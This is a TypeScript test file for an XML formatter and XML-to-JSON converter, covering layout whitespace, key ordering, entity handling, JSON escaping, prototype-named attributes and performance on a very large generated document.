    expect(fmt(text)).toBe(['<r>', '  <!-- note: a > b -->', '  <?pi some data ?>', `  ${inner}`, '  <e></e>', '  <f/>', '</r>', ''].join(LF));
  });

  it('keeps the declaration, the DOCTYPE and the order of what surrounds them', () => {
    const text = `<?xml version="1.0"?><!-- one --><?p a?><!DOCTYPE r [<!ENTITY x "y">]><!-- two --><r><a/></r><!-- three --><?q?>`;
    expect(fmt(text)).toBe(['<?xml version="1.0"?>', '<!-- one -->', '<?p a?>', '<!DOCTYPE r [<!ENTITY x "y">]>', '<!-- two -->', '<r>', '  <a/>', '</r>', '<!-- three -->', '<?q?>', ''].join(LF));
    expect(fmt(text, null)).toBe('<?xml version="1.0"?><!-- one --><?p a?><!DOCTYPE r [<!ENTITY x "y">]><!-- two --><r><a/></r><!-- three --><?q?>');
    expect(fmt('<!DOCTYPE r><r/>')).toBe(`<!DOCTYPE r>${LF}<r/>${LF}`);
  });

  it('minifies by removing layout whitespace only', () => {
    expect(fmt(`<r>${LF}  <a>${LF}    <b/>${LF}    <c> keep </c>${LF}  </a>${LF}  <p>x <i>y</i> z</p>${LF}</r>${LF}`, null)).toBe('<r><a><b/><c> keep </c></a><p>x <i>y</i> z</p></r>');
    expect(fmt('<r xml:space="preserve"> <a/> </r>', null)).toBe('<r xml:space="preserve"> <a/> </r>');
  });

  it('says what it changed and carries the parser notes', () => {
    expect(good(formatXml('<r><a/></r>', '  ')).notes.some(n => n.includes('Whitespace was changed only between tags'))).toBe(true);
    expect(good(formatXml('<r><a/></r>', null)).notes.some(n => n.includes('Whitespace was removed only between tags'))).toBe(true);
    expect(good(formatXml('<!DOCTYPE r SYSTEM "x.dtd"><r/>', '  ')).notes.some(n => n.includes('does not load it'))).toBe(true);
    expect(formatXml('<r><a></r>', '  ').ok).toBe(false);
  });

  it('changes nothing but layout whitespace, and is idempotent, for seeded random documents', () => {
    const random = rng(4404);
    const names = ['a', 'b', 'ns:c', 'item', 'p'];
    const texts = ['text', ' ', LF, `${LF}  `, 'a &amp; b', ' padded ', '&#169;', `x${TAB}y`];
    const make = (depth: number): string => {
      const roll = random();
      if (depth > 4 || roll < 0.2) return pick(random, texts);
      if (roll < 0.27) return `<!--${pick(random, [' c ', '', ' a > b '])}-->`;
      if (roll < 0.32) return `<![CDATA[${pick(random, ['', 'x', '<y>&'])}]]>`;
      if (roll < 0.36) return `<?${pick(random, ['pi', 'q'])}${pick(random, ['', ' d', ' e f '])}?>`;
      const name = pick(random, names);
      const attrs = [
        random() < 0.3 ? ` id="${Math.floor(random() * 9)}"` : '',
        random() < 0.2 ? " q='say &quot;hi&quot;'" : '',
        random() < 0.08 ? ' xml:space="preserve"' : random() < 0.04 ? ' xml:space="default"' : '',
      ].join('');
      if (random() < 0.2) return `<${name}${attrs}/>`;
      const count = Math.floor(random() * 5);
      return `<${name}${attrs}>${Array.from({ length: count }, () => make(depth + 1)).join('')}</${name}>`;
    };
    let checked = 0;
    for (let n = 0; n < 500; n++) {
      const body = Array.from({ length: 1 + Math.floor(random() * 4) }, () => make(1)).join('');
      const text = `${random() < 0.5 ? '<?xml version="1.0"?>' : ''}${random() < 0.3 ? '<!-- lead -->' : ''}<root xmlns:ns="urn:n">${body}</root>${random() < 0.3 ? '<!-- tail -->' : ''}`;
      const original = essence(doc(text));
      for (const indent of ['  ', TAB, null]) {
        const once = fmt(text, indent);
        expect(essence(doc(once)), text).toEqual(original);
        expect(fmt(once, indent), text).toBe(once);
      }
      // Pretty then minify equals minify, and the reverse.
      expect(fmt(fmt(text, '  '), null), text).toBe(fmt(text, null));
      expect(fmt(fmt(text, null), '  '), text).toBe(fmt(text, '  '));
      checked++;
    }
    expect(checked).toBe(500);
  });
});

describe('xmlToJson', () => {
  const toJson = (text: string, options?: Parameters<typeof xmlToJson>[1]) => JSON.parse(good(xmlToJson(text, options)).output) as Record<string, unknown>;

  it('follows the documented model exactly', () => {
    const text = `<?xml version="1.0" encoding="UTF-8" standalone="no"?><!-- lead --><!DOCTYPE r><r xmlns="urn:d" xmlns:p="urn:p" id="1"><item>one</item><item p:k="v">two</item><p:other/>tail<![CDATA[raw <x>]]><!-- c --><?pi d?></r><?after?>`;
    expect(toJson(text)).toEqual({
      declaration: { version: '1.0', encoding: 'UTF-8', standalone: 'no' },
      doctype: '<!DOCTYPE r>',
      before: [{ comment: ' lead ' }],
      root: {
        name: 'r',
        namespace: 'urn:d',
        attributes: { xmlns: 'urn:d', 'xmlns:p': 'urn:p', id: '1' },
        children: [
          { name: 'item', namespace: 'urn:d', children: ['one'] },
          { name: 'item', namespace: 'urn:d', attributes: { 'p:k': 'v' }, children: ['two'] },
          { name: 'p:other', namespace: 'urn:p' },
          'tail',
          { cdata: 'raw <x>' },
          { comment: ' c ' },
          { pi: 'pi', data: 'd' },
        ],
      },
      after: [{ pi: 'after', data: '' }],
    });
  });

  it('writes keys in a fixed order and only the parts that exist', () => {
    expect(good(xmlToJson('<a/>', { indent: '' })).output).toBe(`{"root":{"name":"a"}}${LF}`);
    expect(good(xmlToJson('<a x="1">t</a>', { indent: '' })).output).toBe(`{"root":{"name":"a","attributes":{"x":"1"},"children":["t"]}}${LF}`);
    expect(good(xmlToJson('<?xml version="1.0"?><a/>', { indent: '' })).output).toBe(`{"declaration":{"version":"1.0"},"root":{"name":"a"}}${LF}`);
    expect(good(xmlToJson('<a><b/></a>')).output).toBe(['{', '  "root": {', '    "name": "a",', '    "children": [', '      {', '        "name": "b"', '      }', '    ]', '  }', '}', ''].join(LF));
    expect(good(xmlToJson('<a><b/></a>', { indent: TAB })).output).toContain(`${LF}${TAB}${TAB}"name": "a"`);
  });

  it('keeps repeated elements separate and in order, and never merges mixed content', () => {
    const root = toJson('<r><a>1</a><b/><a>2</a><a>3</a></r>').root as { children: { name: string }[] };
    expect(root.children.map(c => c.name)).toEqual(['a', 'b', 'a', 'a']);
    const mixed = toJson('<p>Some <b>bold</b> and <i>italic</i> text.</p>').root as { children: unknown[] };
    expect(mixed.children).toEqual(['Some ', { name: 'b', children: ['bold'] }, ' and ', { name: 'i', children: ['italic'] }, ' text.']);
  });

  it('leaves out layout whitespace and says how much, or keeps it on request', () => {
    const text = `<r>${LF}  <a>x</a>${LF}  <b> </b>${LF}</r>`;
    const r = good(xmlToJson(text));
    expect((JSON.parse(r.output) as { root: { children: unknown[] } }).root.children).toEqual([{ name: 'a', children: ['x'] }, { name: 'b', children: [' '] }]);
    expect(r.notes.some(n => n.startsWith('3 whitespace-only text nodes between tags left out'))).toBe(true);
    const kept = good(xmlToJson(text, { keepWhitespace: true }));
    expect((JSON.parse(kept.output) as { root: { children: unknown[] } }).root.children).toEqual([`${LF}  `, { name: 'a', children: ['x'] }, `${LF}  `, { name: 'b', children: [' '] }, LF]);
    expect(kept.notes.some(n => n.includes('whitespace-only'))).toBe(false);
    // Whitespace next to real text is content and always stays.
    expect((toJson('<p> a <b/> </p>').root as { children: unknown[] }).children).toEqual([' a ', { name: 'b' }, ' ']);
    expect(good(xmlToJson('<r><a/></r>')).notes.some(n => n.includes('whitespace-only'))).toBe(false);
  });

  it('writes references as the characters they stand for, and says so', () => {
    const r = good(xmlToJson('<a x="1 &amp; 2">&lt;tag&gt; &#169;</a>'));
    expect(JSON.parse(r.output)).toEqual({ root: { name: 'a', attributes: { x: '1 & 2' }, children: [`<tag> ${ch(0xa9)}`] } });
    expect(r.notes.some(n => n.startsWith('2 values had entity or character references'))).toBe(true);
    expect(good(xmlToJson('<a>plain</a>')).notes.some(n => n.includes('references'))).toBe(false);
  });

  it('keeps attributes named like object internals as plain data', () => {
    const out = good(xmlToJson('<a __proto__="p" constructor="c" toString="t"><__proto__/></a>', { indent: '' })).output;
    expect(out).toBe(`{"root":{"name":"a","attributes":{"__proto__":"p","constructor":"c","toString":"t"},"children":[{"name":"__proto__"}]}}${LF}`);
    expect(({} as Record<string, unknown>).p).toBeUndefined();
  });

  it('escapes what JSON must escape, and produces valid JSON for seeded random documents', () => {
    expect(good(xmlToJson(`<a x='"q" \\ &#9;'>line${LF}two &#x1F600; ${ch(0x2028)}</a>`, { indent: '' })).output)
      .toBe(`{"root":{"name":"a","attributes":{"x":"\\"q\\" \\\\ \\t"},"children":["line\\ntwo ${ch(0x1f600)} ${ch(0x2028)}"]}}${LF}`);
    const random = rng(4405);
    const make = (depth: number): string => {
      if (depth > 3 || random() < 0.3) return pick(random, ['t', ' ', '&quot;', '\\', '<!--c-->', '<![CDATA["]]>', '<?p "?>']);
      const name = pick(random, ['a', 'b', 'c']);
      return `<${name}${random() < 0.4 ? ` k="${pick(random, ['v', '&quot;', '\\n', ''])}"` : ''}>${Array.from({ length: Math.floor(random() * 4) }, () => make(depth + 1)).join('')}</${name}>`;
    };
    for (let n = 0; n < 300; n++) {
      const text = `<r>${make(0)}${make(0)}</r>`;
      const count = doc(text).counts.elements;
      for (const options of [{}, { indent: '' }, { keepWhitespace: true }]) {
        const parsed = JSON.parse(good(xmlToJson(text, options)).output) as { root: unknown };
        const elements = (v: unknown): number => (typeof v === 'object' && v !== null && 'name' in v ? 1 + ((v as { children?: unknown[] }).children ?? []).reduce((s: number, c) => s + elements(c), 0) : 0);
        expect(elements(parsed.root), text).toBe(count);
      }
    }
  });

  it('fails like the parser does', () => {
    const r = xmlToJson('<a>&nope;</a>');
    expect(!r.ok && [r.errors[0].line, r.errors[0].column]).toEqual([1, 4]);
  });
});

describe('XML performance at the size limit', () => {
  it('parses, formats and converts a document of about 10,000,000 characters within loose bounds', () => {
    const row = (i: number) => `<host id="${i}" zone="z${i % 7}"><name>host-${i}.example.internal</name><ip>10.${(i >> 16) & 255}.${(i >> 8) & 255}.${i & 255}</ip><note>a &amp; b</note></host>`;
    const rows: string[] = [];
    let size = 0;
    for (let i = 0; size < XML_LIMITS.inputChars - 200; i++) { const r = row(i); rows.push(r); size += r.length; }
    const text = `<?xml version="1.0"?><hosts>${rows.slice(0, -1).join('')}</hosts>`;
    expect(text.length).toBeGreaterThan(9_900_000);
    expect(text.length).toBeLessThanOrEqual(XML_LIMITS.inputChars);
    let started = Date.now();
    const parsed = parseXml(text);
    const parse = Date.now() - started;
    expect(parsed.ok).toBe(true);
    started = Date.now();
    const formatted = formatXml(text, '  ');
    const format = Date.now() - started;
    expect(formatted.ok).toBe(true);
    started = Date.now();
    expect(xmlToJson(text).ok).toBe(true);
    const convert = Date.now() - started;
    expect(parse).toBeLessThan(15_000);
    expect(format).toBeLessThan(20_000);
    expect(convert).toBeLessThan(25_000);
  });
});
